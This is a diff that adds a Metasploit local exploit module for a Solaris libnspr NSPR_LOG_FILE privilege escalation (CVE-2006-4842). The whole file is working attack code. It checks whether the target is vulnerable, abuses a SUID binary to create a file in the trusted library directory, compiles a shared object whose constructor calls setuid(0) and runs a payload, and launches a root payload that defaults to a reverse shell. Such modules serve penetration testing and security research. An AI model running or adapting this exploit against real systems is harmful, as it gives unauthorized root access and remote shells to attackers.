@@ -1,0 +1,250 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Solaris::Priv
+  include Msf::Post::Solaris::System
+  include Msf::Post::Solaris::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Solaris libnspr NSPR_LOG_FILE Privilege Escalation',
+      'Description'    => %q{
+        This module exploits an arbitrary file write vulnerability in the
+        Netscape Portable Runtime library (libnspr) on unpatched Solaris systems
+        prior to Solaris 10u3 which allows users to gain root privileges.
+
+        libnspr versions prior to 4.6.3 allow users to specify a log file with
+        the `NSPR_LOG_FILE` environment variable. The log file is created with
+        the privileges of the running process, resulting in privilege escalation
+        when used in combination with a SUID executable.
+
+        This module writes a shared object to the trusted library directory
+        `/usr/lib/secure` and runs the specified SUID binary with the shared
+        object loaded using the `LD_LIBRARY_PATH` environment variable.
+
+        This module has been tested successfully with libnspr version 4.5.1
+        on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).
+      },
+      'References'     =>
+        [
+          ['BID', '20471'],
+          ['CVE', '2006-4842'],
+          ['EDB', '2543'],
+          ['EDB', '2569'],
+          ['EDB', '2641'],
+          ['URL', 'https://securitytracker.com/id/1017050'],
+          ['URL', 'https://securitytracker.com/id/1017051'],
+          ['URL', 'https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR'],
+          ['URL', 'http://web.archive.org/web/20061118024339/http://labs.idefense.com:80/intelligence/vulnerabilities/display.php?id=418'],
+          ['URL', 'http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1']
+        ],
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'iDefense',     # Discovery
+          'Marco Ivaldi', # Exploit
+          'Brendan Coles' # Metasploit
+        ],
+      'DisclosureDate' => 'Oct 11 2006',
+      'Privileged'     => true,
+      'Platform'       => ['solaris'],
+      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_SPARC],
+      'Targets'        => [['Auto', {}]],
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'DefaultOptions' =>
+        {
+          'PAYLOAD'     => 'solaris/x86/shell_reverse_tcp',
+          'WfsDelay'    => 10,
+          'PrependFork' => true
+        },
+      'DefaultTarget'  => 0))
+    register_options [
+      # Some useful example SUID executables:
+      # * /usr/bin/cancel
+      # * /usr/bin/chkey
+      # * /usr/bin/lp
+      # * /usr/bin/lpset
+      # * /usr/bin/lpstat
+      # * /usr/lib/lp/bin/netpr
+      # * /usr/sbin/lpmove
+      OptString.new('SUID_PATH', [true, 'Path to suid executable (must be linked to a vulnerable version of libnspr4.so)', '/usr/bin/cancel'])
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def suid_bin_path
+    datastore['SUID_PATH']
+  end
+
+  def is_writable?(path)
+    cmd_exec("[ -w #{path} ] && echo true").include? 'true'
+  end
+
+  def mkdir(path)
+    vprint_status "Creating directory '#{path}'"
+    cmd_exec "mkdir -p '#{path}'"
+    register_dir_for_cleanup path
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def upload_and_compile(path, data)
+    upload "#{path}.c", data
+
+    output = cmd_exec "PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/ gcc -fPIC -shared -g -lc -o #{path} #{path}.c"
+    unless output.blank?
+      print_error output
+      fail_with Failure::Unknown, "#{path}.c failed to compile"
+    end
+
+    register_file_for_cleanup path
+  end
+
+  def check
+    unless setuid? suid_bin_path
+      vprint_error "#{suid_bin_path} is not setuid"
+      return CheckCode::Safe
+    end
+    vprint_good "#{suid_bin_path} is setuid"
+
+    unless has_gcc?
+      vprint_error 'gcc is not installed'
+      return CheckCode::Safe
+    end
+    vprint_good 'gcc is installed'
+
+    # libnspr versions 4.5.1, 4.6.1 and 4.6.2 are known to be vulnerable
+    # Earlier versions may also be vulnerable
+    libnspr_pkg_info = cmd_exec 'pkginfo -l SUNWpr'
+    libnspr_pkg_version = libnspr_pkg_info.scan(/VERSION:\s+([\d\.]+),/).flatten.first
+    if libnspr_pkg_version.to_s.eql? ''
+      vprint_error 'Could not determine libnspr version'
+      return CheckCode::Unknown
+    end
+
+    if Gem::Version.new(libnspr_pkg_version) >= Gem::Version.new('4.6.3')
+      vprint_error "libnspr version #{libnspr_pkg_version} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "libnspr version #{libnspr_pkg_version} appears to be vulnerable"
+
+    # Solaris 10 versions prior to the 2006 patches are known to be vulnerable.
+    # Solaris 8 and 9 (SunOS 5.8 and 5.9) are not affected by default,
+    # however third-party software may also introduce a vulnerable version of the library.
+    version = kernel_release
+    if version.to_s.eql? ''
+      vprint_error 'Could not determine Solaris version'
+      return CheckCode::Detected
+    end
+
+    unless Gem::Version.new(version) <= Gem::Version.new('5.10')
+      vprint_error "Solaris version #{version} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "Solaris version #{version} appears to be vulnerable"
+
+    # The vulnerability was patched in various Solaris patches for different platforms.
+    # For more information, see:
+    # - http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1
+    installed_patches = cmd_exec 'showrev -p'
+    [
+      119214, # Solaris 10 (x86)   patch 119214-10
+      119213, # Solaris 10 (SPARC) patch 119213-10
+      119212, # Solaris 9  (x86)   patch 119212-10
+      119211, # Solaris 9  (SPARC) patch 119211-10
+      119209  # Solaris 8  (SPARC) patch 119209-10
+    ].each do |patch|
+      if installed_patches =~ / #{patch}-(\d+)/
+        revision = $1.to_i
+        if revision >= 10
+          vprint_error "Solaris patch #{patch}-#{revision} has been applied"
+          return CheckCode::Safe
+        end
+      end
+    end
+    vprint_good 'Solaris patches are not installed'
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    unless [CheckCode::Detected, CheckCode::Appears].include? check
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    unless is_writable? datastore['WritableDir']
+      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
+    end
+
+    # Create writable file in /usr/lib/secure
+    lib_path = '/usr/lib/secure'
+    lib_name = 'libldap.so.5'
+
+    vprint_status "Creating file #{lib_path}/#{lib_name}"
+    cmd_exec 'umask 0'
+    cmd_exec "NSPR_LOG_MODULES=all:5 NSPR_LOG_FILE=\"#{lib_path}/#{lib_name}\" #{suid_bin_path}"
+    cmd_exec "NSPR_LOG_FILE=#{lib_path}/#{lib_name} #{suid_bin_path}"
+    cmd_exec 'umask 022'
+
+    unless is_writable? "#{lib_path}/#{lib_name}"
+      fail_with Failure::Unknown, "Could not create file '#{lib_path}/#{lib_name}'"
+    end
+
+    print_good "Created file #{lib_path}/#{lib_name}"
+    register_file_for_cleanup "#{lib_path}/#{lib_name}"
+
+    # Upload and compile shared object
+    base_path = "#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}"
+    mkdir base_path
+
+    payload_name = ".#{rand_text_alphanumeric 5..10}"
+    payload_path = "#{base_path}/#{payload_name}"
+
+    so = <<-EOF
+      void __attribute__((constructor)) cons() {
+        setuid(0);
+        setgid(0);
+        execle("#{payload_path}", "", 0, 0);
+        _exit(0);
+      }
+    EOF
+
+    so_name = ".#{rand_text_alphanumeric 5..10}"
+    so_path = "#{base_path}/#{so_name}"
+    upload_and_compile so_path, so
+
+    vprint_status "Writing shared object #{lib_path}/#{lib_name}"
+    cmd_exec "cp '#{so_path}' '#{lib_path}/#{lib_name}'"
+    register_file_for_cleanup "#{lib_path}/#{lib_name}"
+
+    # Upload and execute payload
+    upload payload_path, generate_payload_exe
+    cmd_exec "chmod +x #{payload_path}"
+
+    print_status 'Executing payload...'
+    cmd_exec "LD_LIBRARY_PATH=\"#{lib_path}\" #{suid_bin_path} & echo "
+  end
+end
